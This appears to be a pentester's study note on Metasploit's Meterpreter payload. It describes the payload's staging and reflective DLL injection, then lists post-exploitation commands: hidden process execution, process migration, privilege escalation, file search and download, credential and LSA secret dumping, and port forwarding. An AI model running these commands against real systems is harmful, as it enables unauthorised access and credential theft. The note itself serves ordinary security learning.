Meterpreter payload uses `DLL Injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes.

When the exploit is completed, the following events occur:

- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
- The stager loads the *DLL prefixed with Reflective*. The Reflective stub handles the loading/injection of the DLL.
- The Meterpreter core initializes, establishes an *AES-encrypted* link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
- Lastly, Meterpreter loads extensions. It will always load `stdapi` and load `priv` if the module gives administrative rights. All of these extensions are loaded over AES encryption.

0) **idletime**
	Check how long the user has been idle for.

1) **getuid**
	To Get *PC & Username*
![[Pasted image 20230125093847.png]]

2) **download** [filename]
	%%The File Will Be Downloaded In The Folder You Opened The Meterpreter Shell%%
	![[Pasted image 20230125151004.png]]

3) **upload** [filename]  [pathname]
![[Pasted image 20230125151807.png]]

4) **execute -H -f [filename]**
`-H` : Make the process hidden

5) **webcam_list** 
	Lists The *Webcams Present*
	![[Pasted image 20230125152029.png]]

5) **netstat**
6) **ps** : To See All The *Running Processes*
7)  `migrate -N [process_name]`
Migrate to a different process. Use this if you can't run basic commands like `getuid` in the meterpreter shell.

8) **getsystem** : ***Try*** To *Escalate Priviliges*
9) **shell**
	Get The *Shell* Of That *Specific OS*
	![[Pasted image 20230125152611.png]]

9) `background or bg or CTRL+Z`
	Background the process!

10) **search -f .txt**
```meterpreter
OPTIONS:

    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f   The file pattern glob to search for. (e.g. *secret*.doc?)
    -h        Help Banner.
    -r   Recursivly search sub directories. (Default: true)

Ex: search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf
```

11) `load powershell`
Load powershell in session

12) Load different channels (shells)
```sh
# Show all channels
channel -l

# Select a channel (shell)
channel -i 1
```

---
# Credential Dumping
```meterpreter
// For Password Hash dumping
meterpreter > hashdump
OR
meterpreter > lsa_dump_sam

// For LSA secrets dump
meterpreter > lsa_dump_secrets
```


# Port Forwarding
```meterpreter
// Use -h for help
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
```